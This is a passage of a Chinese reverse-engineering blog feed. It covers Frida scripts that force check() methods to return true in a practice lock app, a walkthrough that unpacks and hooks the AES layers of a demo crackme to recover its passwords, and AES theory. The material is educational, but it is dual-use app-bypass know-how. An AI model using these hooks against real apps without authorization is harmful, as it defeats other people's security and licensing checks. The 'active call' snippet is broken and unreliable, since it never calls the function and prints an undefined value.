            var methodName = methods[i].getName();

            var finalMethodString = methodName.toString();
            // console.log(finalMethodString);
            // hook修改返回值
            innerClass[finalMethodString].implementation = function(){return true};
        }
    });
}
</code></pre>
<h2 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h2><p>第五关的代码使用jadx反编译失败了</p>
<img src="/2023/11/22/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA%E5%88%86%E6%9E%90/image-20231121232432260.png" class="" title="image-20231121232432260">

<p>可以换GDA编译试试</p>
<img src="/2023/11/22/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA%E5%88%86%E6%9E%90/image-20231121232921529.png" class="" title="image-20231121232921529">

<ul>
<li><p>反编译ok，可以看到它加载了<code>DynamicPlugin.dex</code>文件中的<code>com.example.androiddemo.Dynamic.DynamicCheck</code>类</p>
<img src="/2023/11/22/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA%E5%88%86%E6%9E%90/image-20231121233335779.png" class="" title="image-20231121233335779">
</li>
<li><p>但是我们在这里找不到<code>chech()</code>的实现，解压apk找一下这个文件</p>
<img src="/2023/11/22/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA%E5%88%86%E6%9E%90/image-20231121233823317.png" class="" title="image-20231121233823317">

<ul>
<li>找到之后我们可以来hook这个<code>check()</code></li>
</ul>
</li>
</ul>
<p>第五关有点奇怪，试了几种方法都找不到这个类：</p>
<blockquote>
<ol>
<li><p>enumerateClassLoaders</p>
</li>
<li><p>Java.choose</p>
</li>
<li><p>加载外部dex再进行hook</p>
</li>
</ol>
</blockquote>
<p>这个dex文件也在</p>
<img src="/2023/11/22/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA%E5%88%86%E6%9E%90/image-20231122111841402.png" class="" title="image-20231122111841402">

<pre><code class="js">function fifth(){
    Java.perform(function(){
        
        // Java.use("com.example.androiddemo.Dynamic.DynamicCheck").check.implementation = function(){return true};
        Java.enumerateClassLoaders({
            onMatch:function(loader){
                try {
                    if(loader.loadClass("com.example.androiddemo.Dynamic.DynamicCheck")){
                        Java.classFactory.loader = loader;
                        var b = Java.use(loader);
                        console.log(b);
                    }
                } catch (error) {
                    console.log("loadClass error: "+error)
                }
                try {
                    if(loader.findClass("com.example.androiddemo.Dynamic.DynamicCheck")){
                        console.log("Succefully found loader!",loader);
                        Java.classFactory.loader = loader;
                    }
                } catch (error) {
                    console.log("found error "+error)
                    
                }
            },
            onComplete:function(){"enum completed fifth!"}
        })
    })
}

function fifth_1() {
    Java.perform(function () {
        Java.choose("com.example.androiddemo.Dynamic.DynamicCheck", {
            onMatch: function (instance) {
                console.log("Found instance:", instance);
                try {
                    instance.check.implementation = function () {
                        console.log("DynamicCheck.check() is hooked!");
                        return true;
                    };
                } catch (error) {
                    console.log("Error:", error);
                }
            },
            onComplete: function () {
                console.log("Enumeration completed!");
            }
        });
    });
}
</code></pre>
<ul>
<li>先记录下来后续再搞</li>
<li>类在文件中但是加载不上</li>
</ul>
<p><strong>报错</strong></p>
<pre><code class="bash">Error: java.lang.ClassNotFoundException: Didn't find class "com.example.androiddemo.Dynamic.DynamicCheck" on path: DexPathList[[zip file "/data/app/com.example.androiddemo-1/base.apk"],nativeLibraryDirectories=[/data/app/com.example.androiddemo-1/lib/arm64, /data/app/com.example.androiddemo-1/base.apk!/lib/arm64-v8a, /system/lib64, /vendor/lib64]]
    at frida/node_modules/frida-java-bridge/lib/env.js:122
    at ensureClass (frida/node_modules/frida-java-bridge/lib/class-factory.js:380)
    at frida/node_modules/frida-java-bridge/lib/class-factory.js:102
    at /lesson6.js:158
    at frida/node_modules/frida-java-bridge/lib/vm.js:11                                                                                                   
    at frida/node_modules/frida-java-bridge/index.js:279
    at searchClass (/lesson6.js:159)
    at frida/runtime/core.js:55
</code></pre>
<ul>
<li>报错提示在<code>/data/app/com.example.androiddemo-1/base.apk</code>下找不到类名</li>
<li>我们dex的类名是在<code>/data/data/com.example.androiddemo/files/DynamicPlugin.dex</code>文件中</li>
</ul>
<h6 id="尝试使用objection搜索"><a href="#尝试使用objection搜索" class="headerlink" title="尝试使用objection搜索"></a>尝试使用objection搜索</h6><img src="/2023/11/22/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA%E5%88%86%E6%9E%90/image-20231122124632217.png" class="" title="image-20231122124632217">

<ul>
<li>只能找到接口类名，找不到<code>check()</code>的实现类名</li>
</ul>
<p>把pixel XL从7.1刷到了8.1也还是一样</p>
<ul>
<li>暂时先放下，回头有时间可以再试试其它系统或者frida版本</li>
<li>这个应该是环境的问题，因为类名只要加载了使用<code>Java.use</code>肯定是可以hook到的，但是现在就是没有加载上哪里都找不到</li>
</ul>
<h2 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h2><img src="/2023/11/22/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA%E5%88%86%E6%9E%90/image-20231122010851298.png" class="" title="image-20231122010851298">

<img src="/2023/11/22/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA%E5%88%86%E6%9E%90/image-20231122011214532.png" class="" title="image-20231122011214532">

<ul>
<li>还是修改这几个返回值为<code>true</code></li>
</ul>
<p>直接通过<code>java.use</code>修改就可以</p>
<pre><code class="js">function sixth(){
    Java.perform(function(){
        Java.use("com.example.androiddemo.Activity.Frida6.Frida6Class0").check.implementation = function(){return true};
        Java.use("com.example.androiddemo.Activity.Frida6.Frida6Class1").check.implementation = function(){return true};
        Java.use("com.example.androiddemo.Activity.Frida6.Frida6Class2").check.implementation = function(){return true};  
    })
}
</code></pre>
<p>同样的我们也可以把这个脚本修改为枚举的方式，方便批量修改</p>
<p>枚举HOOK脚本</p>
<pre><code class="js"> Java.perform(function(){
        Java.enumerateLoadedClasses({
            onMatch:function(name, handle){
                if(name.toString().indexOf("com.example.androiddemo.Activity.Frida6") &gt;= 0){
                    // console.log("name", name);
                    Java.use(name).check.implementation = function(){return true}
                }
            },onComplete(){}
        })
    })
</code></pre>
<p>最后第七关没有东西</p>
<img src="/2023/11/22/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA%E5%88%86%E6%9E%90/image-20231122133841569.png" class="" title="image-20231122133841569">



<p>附件：</p>
<p>hook<a href="https://github.com/xiaoeeyu/Six-layer-lock_HOOK/tree/main">脚本</a></p>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Frida逆向与利用自动化</tag>
        <tag>Frida HOOK</tag>
        <tag>处理各种函数返回值</tag>
      </tags>
  </entry>
  <entry>
    <title>分组密码-逆向实践</title>
    <url>/2024/03/05/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-%E9%80%86%E5%90%91%E5%AE%9E%E8%B7%B5/</url>
    <content><![CDATA[<p>之前几章已经对分组密码的原理以及填充进行了详细分析，本章使用一个demo来进行实战分析</p>
<ul>
<li>一个两层密钥的demo，第一层是java中的AES，第二层是native层的AES加密</li>
</ul>
<span id="more"></span>

<h4 id="第一层"><a href="#第一层" class="headerlink" title="第一层"></a>第一层</h4><img src="/2024/03/05/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-%E9%80%86%E5%90%91%E5%AE%9E%E8%B7%B5/image-20240302153336992.png" class="" title="image-20240302153336992">

<ul>
<li><p>以32位安装方便进行分析测试</p>
</li>
<li><p>一个简单demo，打开界面是输入框和按钮，点击按钮后校验密码错误的话，会弹窗提示错误</p>
</li>
</ul>
<img src="/2024/03/05/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-%E9%80%86%E5%90%91%E5%AE%9E%E8%B7%B5/image-20240302153810848.png" class="" title="image-20240302153810848">

<ul>
<li>GDA打开看到有360的加固，先脱壳</li>
<li>不想刷脱壳机使用<a href="https://github.com/hanbinglengyue/FART">frida_fart_hook</a>脚本脱壳也行，使用方法脚本里面写的很清楚，<a href="https://xiaoeeyu.github.io/2024/02/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/#%E8%84%B1%E5%A3%B3">之前</a>也讲过了这里不再赘述</li>
</ul>
<h5 id="分析脱壳后的dex"><a href="#分析脱壳后的dex" class="headerlink" title="分析脱壳后的dex"></a>分析脱壳后的dex</h5><img src="/2024/03/05/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-%E9%80%86%E5%90%91%E5%AE%9E%E8%B7%B5/image-20240302210407725.png" class="" title="image-20240302210407725">

<ul>
<li>直接查看<em>onClick()<em>函数，看到这里的校验是在</em>test4()<em>函数里面做的，那就继续分析</em>test4()</em></li>
</ul>
<img src="/2024/03/05/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-%E9%80%86%E5%90%91%E5%AE%9E%E8%B7%B5/image-20240302210847042.png" class="" title="image-20240302210847042">

<ul>
<li>这里算法特征相关的函数和字符串都已经被隐藏了。这里只能看到一个key、IV以及要与之比较的一个值，不能看到是什么加密和工作以及填充模式</li>
<li>所以如果想要搞清楚这些东西，需要使用hook的方式来获取</li>
</ul>
<h5 id="编写frida-hook脚本"><a href="#编写frida-hook脚本" class="headerlink" title="编写frida_hook脚本"></a>编写frida_hook脚本</h5><img src="/2024/03/05/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-%E9%80%86%E5%90%91%E5%AE%9E%E8%B7%B5/image-20240302213934522.png" class="" title="image-20240302213934522">

<blockquote>
<ol>
<li>hook *loadClass()*获取它的参数看是加载了哪个类</li>
<li>hook *contains()*获取它的参数查看前面获取了哪个method</li>
</ol>
<pre><code class="js">function main(){
    if(Java.available){
        Java.perform(function(){
            Java.use("java.lang.ClassLoader").loadClass.overload('java.lang.String').implementation = function(arg0){
                console.log("java.lang.ClassLoader-&gt;loadClass: ", arg0);
                var result = this.loadClass(arg0);
                return result;
            }
            Java.use("java.lang.String").contains.implementation = function(arg0){
                var result = this.contains(arg0);
                // 这里因为dex中的代码是使用反射的方式来调用函数的，所以按函数逻辑加一个结果为true才打印，看起来会清楚点，不然打印的结果会非常多
                if(result == true){
                    console.log("java.lang.String-&gt;contains: ", arg0);
                }
                return result;
            }
        })
    }
}

setImmediate(main)
</code></pre>
<img src="/2024/03/05/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-%E9%80%86%E5%90%91%E5%AE%9E%E8%B7%B5/image-20240302215805830.png" class="" title="image-20240302215805830">

<ul>
<li>让脚本以<strong>Attach</strong>附加的方式启动，在*onClick()*点击的时候触发。不然这种通用函数触发的位置太多了</li>
<li>根据触发后的打印结果来看：<ul>
<li>*loadClass()*加载了Cipher类</li>
<li>然后通过反射的方式拿到了getInstance()、doFinal()、init()三个方法</li>
</ul>
</li>
<li>通过打印结果知道了它的调用方法之后，就直接hook这些函数就可以了</li>
</ul>
<pre><code class="js">function hookCipher(){
    Java.perform(function(){
        Java.use('javax.crypto.Cipher').getInstance.overload('java.lang.String').implementation = function(arg0){
            console.log('javax.crypto.Cipher.getInstance is called!', arg0);
            var result = this.getInstance(arg0);
            return result;
        };
        // cipher.init(Cipher.ENCRYPT_MODE, getRawKey(key), iv);
        Java.use('javax.crypto.Cipher').init.overload('int', 'java.security.Key', 'java.security.spec.AlgorithmParameterSpec').implementation = function(arg0, arg1, arg2){
            // console.log("javax.crypto.Cipher.init is called!", arg0, arg1, arg2);
            var mode = arg0;
            var key = arg1;
            var iv = arg2;
            var KeyClass = Java.use('java.security.Key');
            var keyobj = Java.cast(key, KeyClass);
            var key_bytes = keyobj.getEncoded();
            // 把ASCII编码的字符数组转为字符打印出来，方便我们查看
            var StringClass = Java.use('java.lang.String');
            var key_string = StringClass.$new(key_bytes);
            console.log("key_string: ", key_string);

            var IVClass = Java.use('javax.crypto.spec.IvParameterSpec');
            var ivobj = Java.cast(iv, IVClass);
            var iv_bytes = ivobj.getIV();
            // 这里同样打印出来方便查看
            var iv_string = StringClass.$new(iv_bytes);
            console.log("iv_string: ", iv_string);

            console.log("javax.crypto.Cipher.init is called!", mode, JSON.stringify(key_bytes), JSON.stringify(iv_bytes));
            var result = this.init(arg0, arg1, arg2);
            return result;
        };
        // doFinal
        Java.use('javax.crypto.Cipher').doFinal.overload('[B').implementation = function(arg0){
            console.log("javax.crypto.Cipher.doFinal is called!", JSON.stringify(arg0));
            var data = arg0;
            var result = this.doFinal(arg0);
            console.log("javax.crypto.Cipher.doFinal is called!", JSON.stringify(data), "encrypt: ", JSON.stringify(result));
            return result;
        };
    })
}
</code></pre>
<img src="/2024/03/05/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-%E9%80%86%E5%90%91%E5%AE%9E%E8%B7%B5/image-20240302224232576.png" class="" title="image-20240302224232576">

<p>现在就可以去<a href="https://gchq.github.io/CyberChef/">CyberChef</a>中计算出AES的明文了：qazwsxedcrfvtgbyhnujm</p>
<img src="/2024/03/05/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-%E9%80%86%E5%90%91%E5%AE%9E%E8%B7%B5/image-20240302224535913.png" class="" title="image-20240302224535913">
</blockquote>
<h4 id="第二层"><a href="#第二层" class="headerlink" title="第二层"></a>第二层</h4><h5 id="分析native层AES加密"><a href="#分析native层AES加密" class="headerlink" title="分析native层AES加密"></a>分析native层AES加密</h5><img src="/2024/03/05/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-%E9%80%86%E5%90%91%E5%AE%9E%E8%B7%B5/image-20240303135914400.png" class="" title="image-20240303135914400">

<ul>
<li>第二层获取密钥需要分析这个*test3()*函数 ，它是一个静态注册的native函数，我们用ida打开so文件进行分析</li>
</ul>
<img src="/2024/03/05/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-%E9%80%86%E5%90%91%E5%AE%9E%E8%B7%B5/image-20240303154024866.png" class="" title="image-20240303154024866">

<ul>
<li><p>分析这个函数</p>
<img src="/2024/03/05/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-%E9%80%86%E5%90%91%E5%AE%9E%E8%B7%B5/image-20240305011501631.png" class="" title="image-20240305011501631">

<ul>
<li>对这个函数经过分析之后，发现*sub_9744()*这个函数的返回值比较重要，要参与到后面的循环中让v5和v7两个字符数组进行比较，而且这个函数的接受了我们输入的字符串，和一串疑似是key的字符串。</li>
<li>那等下就可以来hook这个函数看它的参数和返回值是什么，不出意外应该就是返回加密后的字符数组。然后让加密后的数组v5和v7进行对比，数组长度是32位</li>
</ul>
</li>
<li><p>但是，现在我们还没有在so中看出来这里用到了什么算法和什么工作模式、填充方式</p>
<p>这里使用FindCrypt插件去分析匹配一下</p>
<img src="/2024/03/05/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-%E9%80%86%E5%90%91%E5%AE%9E%E8%B7%B5/image-20240303161147250.png" class="" title="image-20240303161147250">

<p>匹配到了AES的S盒跟S盒逆，通过这些S盒进行交叉引用就能跟踪到它最终在*sub_9744()*中进行了调用</p>
</li>
</ul>
<h5 id="编写frida-hook脚本-1"><a href="#编写frida-hook脚本-1" class="headerlink" title="编写frida_hook脚本"></a>编写frida_hook脚本</h5><p>对*sub_9744()*函数进行主动调用和hook</p>
<p>在前面我们分析源码的时候看过在Android中对so的加载是通过*loadLibrary()*进行加载的</p>
<img src="/2024/03/05/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-%E9%80%86%E5%90%91%E5%AE%9E%E8%B7%B5/image-20240303165307864.png" class="" title="image-20240303165307864">

<blockquote>
<ol>
<li>在之前的文章中已经分析过源码，这里不能直接对*loadLibrary()*进行hook，而要对loadelibrary()下面的加载函数进行hook</li>
</ol>
<img src="/2024/03/05/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-%E9%80%86%E5%90%91%E5%AE%9E%E8%B7%B5/image-20240304004816743.png" class="" title="image-20240304004816743">

<ul>
<li><p>在Android8.0的源码中是*loadLibrary0()*，这个要根据不同版本来hook不同的函数</p>
</li>
<li><p>对于so的hook要选择一个时机，在*loadLibrary0()*加载了so文件之后，我们就可以对so文件中的函数进行hook了</p>
<pre><code class="js">function hooksoMain(){
    if(Java.available){
        Java.perform(function(){
            Java.use("java.lang.Runtime").loadLibrary0.implementation = function(arg0, arg1){
                console.log("java.lang.Runtime-&gt;loadLibrary0: ", arg1);
                var result = this.loadLibrary0(arg0, arg1);
                if(arg1.indexOf('native-lib') != -1){
                    hookso();
                }
                return result;
            }
        })
    }
}
    
</code></pre>
</li>
</ul>
<ol start="2">
<li><p>根据前面的分析，我们这里对*sub_9744()*进行hook</p>
<pre><code class="js">function hookso() {
    var nativelibmodul = Process.getModuleByName("libnative-lib.so");
    var sub_9744_addr = nativelibmodul.base.add(0x9745);
    console.log("sub_9744:",sub_9744_addr);
    Interceptor.attach(sub_9744_addr, {
        onEnter: function (args) {
            console.log("sub_9744_addr arg0:", hexdump(args[0]));
            console.log("sub_9744_addr arg1:", hexdump(args[1]));
            console.log("sub_9744_addr arg2:", hexdump(args[2]));
        }, onLeave: function (retval) {
            console.log("sub_9744_addr retval:", hexdump(ptr(retval)));
        }
    })
}
</code></pre>
<img src="/2024/03/05/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-%E9%80%86%E5%90%91%E5%AE%9E%E8%B7%B5/image-20240305005650025.png" class="" title="image-20240305005650025">

<ul>
<li><p>以<strong>Spawn（生成模式）</strong>运行脚本<code>frida -U -f 包名 -l 脚本名 --no-pause</code>，需要先手动输入第一层密码，然后再尝试随便输入一个字符串当作第二层密码（这里输入的还是第一层的密码），查看被hook函数的返回值</p>
<blockquote>
<p>arg0是要加密的明文</p>
<p>arg1是key</p>
<p>arg2是IV</p>
<p>返回值是加密后的串</p>
</blockquote>
</li>
<li><p>现在根据返回值和我们前面在ida中识别到的S盒，得知这是一个AES加密函数。但是对于工作模式和填充方式还是不知道。在有IV的情况下CBC、OFB、CFB都有可能可以在CyberChef中把这三种都尝试一下，看哪个结果能对上</p>
<img src="/2024/03/05/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-%E9%80%86%E5%90%91%E5%AE%9E%E8%B7%B5/image-20240305010033525.png" class="" title="image-20240305010033525">

<p>经过验证，CBC模式的加密结果和我们上面hook后得到的返回值是相同的，说明他就是CBC工作模式，加密后的结果长度是32位=明文的整数倍，可知它的填充模式是<strong>PKCS5Padding</strong>或者<strong>PKCS7Padding</strong></p>
</li>
</ul>
</li>
<li><p>最后在补充一点</p>
<p>在测试的时候有时候需要一遍遍的重启来hook app，每次都手动输入第一层的密码比较麻烦，可以使用frida提供的*NativeFunction()*来直接主动调用目标函数，方便直接测试第二层的结果是否正确</p>
<pre><code class="js">function activecallsub_9744() {
    var arg0=Memory.alloc(21);
    ptr(arg0).writeUtf8String('ujmyhntgbrfvedcwsxqaz');
    var arg1=Memory.alloc(21);
    ptr(arg1).writeUtf8String('i am encrypt key');
    var arg2=Memory.alloc(21);
    // 将十六进制字节序列写入到指定内存地址
    var byteArray = [0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f];
    var ptrArg2 = ptr(arg2);
    ptrArg2.writeByteArray(byteArray);
    console.log("activecallsub_9744",hexdump(ptr(retval)));
}
</code></pre>
</li>
</ol>
</blockquote>
<h5 id="验证结果"><a href="#验证结果" class="headerlink" title="验证结果"></a>验证结果</h5><img src="/2024/03/05/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-%E9%80%86%E5%90%91%E5%AE%9E%E8%B7%B5/image-20240305013720775.png" class="" title="image-20240305013720775">

<ul>
<li><p>在IDA中可以看到v7的值来自数组<em>byte_17FA5</em></p>
</li>
<li><p>接下来用cyberChef对这个值进行解密</p>
<img src="/2024/03/05/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-%E9%80%86%E5%90%91%E5%AE%9E%E8%B7%B5/image-20240305014013246.png" class="" title="image-20240305014013246">

<ul>
<li>ujmyhntgbrfvedcwsxqaz</li>
</ul>
</li>
<li><p>在编辑框中输入这个值</p>
<img src="/2024/03/05/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-%E9%80%86%E5%90%91%E5%AE%9E%E8%B7%B5/image-20240305014602097.png" class="" title="image-20240305014602097">

<img src="/2024/03/05/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-%E9%80%86%E5%90%91%E5%AE%9E%E8%B7%B5/image-20240305014655559.png" class="" title="image-20240305014655559">

<ul>
<li>成功通过了验证</li>
</ul>
</li>
</ul>
<h5 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h5><p><a href="https://github.com/xiaoeeyu/cipher7test_decrypt/tree/main">完整代码</a></p>
]]></content>
      <categories>
        <category>Android逆向</category>
        <category>加密解密</category>
      </categories>
      <tags>
        <tag>Frida Hook</tag>
        <tag>AES</tag>
      </tags>
  </entry>
  <entry>
    <title>分组密码-AES</title>
    <url>/2024/02/29/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-AES/</url>
    <content><![CDATA[<p>本章主要是学习AES如何实现，如何对java中的AES方法进行hook，以及定位so文件中的AES</p>
<p>这里以AES-128为例，会对明文分组进行10轮迭代运算，加密的第1轮到第9轮的函数一样，包括4个操作：字节替换、行位移、列混合和轮密钥加。最后一轮迭代不执行行列混合。另外，在第一轮迭代之前，先将明文和原始密钥进行一次异或加密操作。</p>
<span id="more"></span>

<img src="/2024/02/29/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-AES/image-20240224151413242.png" class="" title="image-20240224151413242">

<h2 id="AES加解密理论"><a href="#AES加解密理论" class="headerlink" title="AES加解密理论"></a>AES加解密理论</h2><img src="/2024/02/29/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-AES/aes_details-17090032877272.jpg" class="" title="img">

<img src="/2024/02/29/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-AES/aes_enc_dec.png" class="" title="img">

<center>AES实现的原理图</center>

<p>AES的加解密，跟DES一样由左右两部分组成</p>
<p>左边是对明文（16字节）进行的一个10轮的迭代处理</p>
<blockquote>
<p>第一轮到第9轮每一轮都有四个操作：</p>
<p>AddRoundKey 为 异或<br>SubBytes 为 查表替换<br>ShiftRows 为 按字节循环左移<br>MixColumns 为 矩阵乘法</p>
</blockquote>
<p>右边是对密钥（16字节）进行编排，生成每一轮对应的子密钥。</p>
<h6 id="查表替换（字节替换、字节代换）"><a href="#查表替换（字节替换、字节代换）" class="headerlink" title="查表替换（字节替换、字节代换）"></a>查表替换（字节替换、字节代换）</h6><p>查表替换的主要功能是通过S盒完成一个字节到另一个字节的映射。本质上就是一个查表操作。有两个表一个是S盒一个是S盒逆。S盒用于提高密码算法的混淆性，S盒是快速判断AES加密算法的最有效的特征。</p>
<h3 id="AES算法流程分析"><a href="#AES算法流程分析" class="headerlink" title="AES算法流程分析"></a>AES算法流程分析</h3><p>这里介绍的是AES-128，也就是密钥的长度为128位，加密轮数为10轮</p>
<p>AES的加密公式为**C = E(K,P)**，在加密函数E中，会执行一个函数，并且执行10次这个轮函数，这个轮函数的前9次执行的操作是一样的，只有第10次有所不同。也就是说，一个明文分组会被加密10轮。AES的核心就是实现一轮中的所有操作。</p>
<h5 id="明文矩阵填充"><a href="#明文矩阵填充" class="headerlink" title="明文矩阵填充"></a>明文矩阵填充</h5><p>AES的处理单位是字节，128位的输入明文分组P和输入密钥K都被分成16个字节，分别记为P = P0 P1 … P15和 K = K0 K1 … K15。如，明文分组为P = abcdefghijklmnop,其中的字符a对应P0，p对应P15。一般地，明文分组用字节为单位的正方形矩阵描述，称为状态矩阵。在算法的每一轮中，状态矩阵的内容不断发生变化，最后的结果作为密文输出。该矩阵中字节的排列顺序为从上到下、从左至右依次排列。</p>
<img src="/2024/02/29/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-AES/format,png.png" class="" title="state">

<center>状态矩阵</center>

<h5 id="密钥矩阵填充"><a href="#密钥矩阵填充" class="headerlink" title="密钥矩阵填充"></a>密钥矩阵填充</h5><p>类似地，128位密钥也是用字节为单位的矩阵表示，矩阵的每一列被称为1个32位比特字。通过密钥编排函数该密钥矩阵被扩展成一个44个字组成的序列W[0],W[1], … ,W[43]，该序列的前四个元素W[0],W[1],W[2],W[3]是原始密钥，用于加密运算中的初始密钥（下面介绍）；后面40个字分为10组，每组4个字（4x4x8 = 128bit）分别用于10轮加密运算中的轮密钥加。后面的10组密钥通过初始密钥进行密钥扩展得到。</p>
<img src="/2024/02/29/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-AES/%E5%9B%BE%E7%89%87-21.png" class="" title="img">

<center>密钥矩阵</center>

<h5 id="加解密流程"><a href="#加解密流程" class="headerlink" title="加解密流程"></a>加解密流程</h5><p>AES加解密主要要以下几步操作，完整的加解密流程是通过循环以下步骤来完成的，具体如下图表示</p>
<ul>
<li>轮密钥加</li>
<li>字节替换</li>
<li>行位移</li>
<li>列混合</li>
</ul>
<img src="/2024/02/29/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-AES/format,png-17090177948337.png" class="" title="aes_struct">

<center>加解密流程</center>

<h5 id="加解密步骤分析"><a href="#加解密步骤分析" class="headerlink" title="加解密步骤分析"></a>加解密步骤分析</h5><p>字节替换</p>
<p>AES的字节替换其实就是通过一个简单的查表操作来进行非线性运算。AES定义了一个S盒和一个逆S盒。分别用来加解密操作。</p>
<img src="/2024/02/29/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-AES/%E5%9B%BE%E7%89%87-22-1024x703.png" class="" title="img">

<center>S盒</center>

<p>状态矩阵中的元素按照下面的方式映射为一个新的字节：把该字节的高4位作为行值，低4位作为列值，取出S盒或者逆S盒中对应的行的元素作为输出。例如，加密时输出的字节S1=0X12，则查找S盒的第0X01行和0X02列，得到值0XC9，然后替换S1原有的值0X12为0XC9。状态矩阵经字节代换后的图如下</p>
<img src="/2024/02/29/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-AES/%E5%9B%BE%E7%89%87-23.png" class="" title="img">

<center>字节变换</center>

<p>逆字节代换也就是查逆S盒来变换，逆S盒如下</p>
<img src="/2024/02/29/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-AES/%E5%9B%BE%E7%89%87-24-1024x704.png" class="" title="img">

<center>逆S盒</center>

<h5 id="行移位"><a href="#行移位" class="headerlink" title="行移位"></a>行移位</h5><p>行移位是一个简单的左循环移位操作。当密钥长度为128bit时，状态矩阵的第0行左移0字节，第1行左移1字节，第2行左移2字节。。。如下图所示</p>
<img src="/2024/02/29/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-AES/%E5%9B%BE%E7%89%87-25.png" class="" title="img">

<center>行移位</center>

<p>行移位的逆变换是将状态矩阵中的每一行执行相反的移位操作，例如AES-128中，状态矩阵的第0行右移0字节，第1行右移1字节，第2行右移2字节。。。</p>
<h5 id="列混合"><a href="#列混合" class="headerlink" title="列混合"></a>列混合</h5><p>列混合变换是通过矩阵相乘来实现的，经行移位后的状态矩阵与固定的矩阵相乘，得到混淆后的状态矩阵，如下图的公式所示</p>
<img src="/2024/02/29/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-AES/%E5%9B%BE%E7%89%87-26.png" class="" title="img">

<center>列混合</center>

<p>状态矩阵中的第j列(0 ≤j≤3)的列混合可以表示为下图所示</p>
<img src="/2024/02/29/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-AES/%E5%9B%BE%E7%89%87-27.png" class="" title="img">

<p>其中，矩阵运算的乘法和加法都是定义在基于GF(2^8)上的二元运算，并不是通常意义上的乘法和加法。</p>
<p>逆向列混合变换同样可由下图的矩阵乘法定义</p>
<img src="/2024/02/29/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-AES/%E5%9B%BE%E7%89%87-28.png" class="" title="img">

<center>逆列混合</center>

<h5 id="轮密钥加"><a href="#轮密钥加" class="headerlink" title="轮密钥加"></a>轮密钥加</h5><p>轮密钥加是将128位轮密钥Ki同状态矩阵中的数据进行逐位异或操作，如下图所示。其中，密钥Ki中每个字W[4i],W[4i+1],W[4i+2],W[4i+3]为32位bit字，包含4个字节，轮密钥加过程可以看成是字逐位异或的结果，也可以看成字节级别或者位级别的操作。也就是说，可以看成S0、S1、S2、S3组成的32位字与W[4i]的异或运算。</p>
<img src="/2024/02/29/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-AES/%E5%9B%BE%E7%89%87-29.png" class="" title="img">

<center>轮密钥加</center>

<h5 id="密钥扩展"><a href="#密钥扩展" class="headerlink" title="密钥扩展"></a>密钥扩展</h5><p>AES首先将初始密钥输入到一个4×4的状态矩阵中，如下图所示</p>
<img src="/2024/02/29/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81-AES/%E5%9B%BE%E7%89%87-30.png" class="" title="img">

<center>密钥扩展</center>

<p>4×4矩阵的每一列的4个字节组成一个字，矩阵4列的4个字依次命名为W[0]、W[1]、W[2]、W[3]，它们构成一个以字为单位的数组W。</p>
<p>接着，对W数组扩充40个新列，构成总共44列的扩展密钥数组。新列一如下的递归方式产生</p>
<ol>
<li><p>如果i不是4的倍数，那么i列由如下等式确定：</p>
<p>$W[i]=W[i-4]⨁W[i-1]$</p>
</li>
<li><p>如果i是4的倍数，那么第i列由如下等式确定：</p>
<p>$W[i]=W[i-4]⨁T(W[i-1])$</p>
</li>
</ol>
<p>T是一个有点复杂的函数，由3部分组成：自循环、字节代换和轮常量异或，这3部分的作用分别如下</p>
<ol>
<li>字循环：将1个字中的4个字节循环左移一个字节。即将输入字[b0, b1, b2, b3]变换成[b1,b2,b3,b0]</li>
<li>字节代换：对字循环的结果使用S盒进行字节代换</li>
